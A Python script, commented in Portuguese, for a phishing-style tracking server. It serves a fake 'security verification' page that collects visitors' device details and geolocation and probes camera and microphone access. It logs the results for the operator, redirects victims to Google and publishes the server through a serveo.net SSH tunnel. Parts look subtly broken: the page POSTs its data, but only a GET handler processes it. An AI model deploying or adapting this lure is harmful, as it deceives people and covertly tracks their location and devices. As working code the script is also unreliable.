import os
import time
import json
import re
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import subprocess
from datetime import datetime

PORT = 8080
LOG_FILE = "device_logs.txt"
REDIRECT_URL = "https://www.google.com"  # URL para redirecionamento após coleta

class DeviceHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Verificação de Segurança</title>
                <script>
                    async function collectDeviceInfo() {{
                        const deviceInfo = {{
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            screenWidth: screen.width,
                            screenHeight: screen.height,
                            colorDepth: screen.colorDepth,
                            language: navigator.language,
                            location: null,
                            camera: false,
                            audio: false,
                            deviceType: getDeviceType(),
                            browser: getBrowserInfo(),
                            os: getOSInfo(),
                            errors: []
                        }};

                        try {{
                            // Coleta de geolocalização
                            try {{
                                const position = await new Promise((resolve, reject) => {{
                                    navigator.geolocation.getCurrentPosition(resolve, reject);
                                }});
                                deviceInfo.location = {{
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                }};
                            }} catch (error) {{
                                deviceInfo.errors.push('Location: ' + error.name);
                            }}
                            
                            // Verificação de câmera
                            try {{
                                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                                deviceInfo.camera = true;
                                stream.getTracks().forEach(track => track.stop());
                            }} catch (error) {{
                                deviceInfo.errors.push('Camera: ' + error.name);
                            }}
                            
                            // Verificação de microfone
                            try {{
                                const audioStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                                deviceInfo.audio = true;
                                audioStream.getTracks().forEach(track => track.stop());
                            }} catch (error) {{
                                deviceInfo.errors.push('Audio: ' + error.name);
                            }}
                            
                            // Envia os dados coletados
                            await sendToServer(deviceInfo);
                            
                            // Redireciona após 3 segundos
                            setTimeout(() => {{
                                window.location.href = "{REDIRECT_URL}";
                            }}, 3000);
                            
                        }} catch (error) {{
                            deviceInfo.errors.push('General: ' + error.message);
                            await sendToServer(deviceInfo);
                            window.location.href = "{REDIRECT_URL}";
                        }}
                    }}
                    
                    function getDeviceType() {{
                        const userAgent = navigator.userAgent;
                        if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {{
                            return 'Mobile';
                        }} else if (/Tablet|iPad/i.test(userAgent)) {{
                            return 'Tablet';
                        }} else {{
                            return 'Desktop';
                        }}
                    }}
                    
                    function getBrowserInfo() {{
                        const userAgent = navigator.userAgent;
                        let browser = 'Unknown';
                        
                        if (userAgent.includes('Chrome')) browser = 'Chrome';
                        else if (userAgent.includes('Firefox')) browser = 'Firefox';
                        else if (userAgent.includes('Safari')) browser = 'Safari';
                        else if (userAgent.includes('Edge')) browser = 'Edge';
                        else if (userAgent.includes('Opera')) browser = 'Opera';
                        else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
                        
                        return browser;
                    }}
                    
                    function getOSInfo() {{
                        const userAgent = navigator.userAgent;
                        let os = 'Unknown';
                        
                        if (userAgent.includes('Windows')) os = 'Windows';
                        else if (userAgent.includes('Mac')) os = 'MacOS';
                        else if (userAgent.includes('Linux')) os = 'Linux';
                        else if (userAgent.includes('Android')) os = 'Android';
                        else if (userAgent.includes('iOS') || /iPhone|iPad|iPod/i.test(userAgent)) os = 'iOS';
                        
                        return os;
                    }}
                    
                    async function sendToServer(data) {{
                        try {{
                            await fetch('/log', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                }},
                                body: JSON.stringify(data)
                            }});
                        }} catch (error) {{
                            console.error('Error sending data:', error);
                        }}
                    }}
                    
                    window.onload = function() {{
                        collectDeviceInfo();
                    }};
                </script>
            </head>
            <body>
                <h1>Verificação de Segurança em Andamento</h1>
                <p>Por favor, aguarde enquanto verificamos seu dispositivo...</p>
                <p>Você será redirecionado automaticamente em breve.</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        
        elif self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            self.log_device_info(post_data.decode('utf-8'))
            self.send_response(200)
            self.end_headers()
        
        else:
            self.send_error(404)
    
    def log_device_info(self, data):
        try:
            device_data = json.loads(data)
            
            # Formatação dos dados para log
            log_entry = f"""
            ╔════════ NOVO ACESSO ════════╗
            ║ Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            ╠══════════════════════════════╣
            ║ Dispositivo: {device_data.get('deviceType', 'N/A')}
            ║ Navegador: {device_data.get('browser', 'N/A')}
            ║ Sistema Operacional: {device_data.get('os', 'N/A')}
            ║ User Agent: {device_data.get('userAgent', 'N/A')}
            ║ Idioma: {device_data.get('language', 'N/A')}
            ║ Tela: {device_data.get('screenWidth', 'N/A')}x{device_data.get('screenHeight', 'N/A')}
            ╠══════════════════════════════╣
            ║ Geolocalização: {device_data.get('location', 'Negada/Não disponível')}
            ║ Câmera: {'Disponível' if device_data.get('camera', False) else 'Indisponível/Negada'}
            ║ Microfone: {'Disponível' if device_data.get('audio', False) else 'Indisponível/Negada'}
            ╠══════════════════════════════╣
            ║ Erros: {', '.join(device_data.get('errors', ['Nenhum']))}
            ╚══════════════════════════════╝
            """
            
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n\n')
            
            print(log_entry)
            
        except Exception as e:
            error_msg = f"Erro ao processar dados do dispositivo: {str(e)}"
            print(error_msg)
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(error_msg + '\n')

def start_server():
    server = HTTPServer(('0.0.0.0', PORT), DeviceHandler)
    print(f"Servidor rodando na porta {PORT}")
    print(f"Logs serão salvos em: {os.path.abspath(LOG_FILE)}")
    print(f"Redirecionando para: {REDIRECT_URL}")
    server.serve_forever()

def start_serveo():
    print("Iniciando túnel Serveo... (pode levar alguns segundos)")
    subprocess.run(f"ssh -R 80:localhost:{PORT} serveo.net > serveo.log 2>&1", shell=True)
    time.sleep(5)  # Tempo para o Serveo estabelecer conexão
    
    try:
        with open("serveo.log", "r") as f:
            for line in f:
                if "serveo.net" in line:
                    public_url = line.split()[-1]
                    print(f"\n✅ URL PÚBLICA PARA ACESSO:")
                    print(f"👉 {public_url}")
                    print("\n⚠️ Quando alguém acessar, as informações aparecerão abaixo")
                    break
    except:
        print("Não foi possível obter a URL do Serveo. Verifique a conexão.")

if __name__ == "__main__":
    try:
        # Limpar arquivo de log anterior
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        
        # Iniciar servidor em uma thread separada
        server_thread = threading.Thread(target=start_server)
        server_thread.daemon = True
        server_thread.start()
        
        # Iniciar Serveo após pequeno delay
        time.sleep(1)
        serveo_thread = threading.Thread(target=start_serveo)
        serveo_thread.daemon = True
        serveo_thread.start()
        
        print("\nPressione Ctrl+C para encerrar o servidor\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nServidor encerrado")
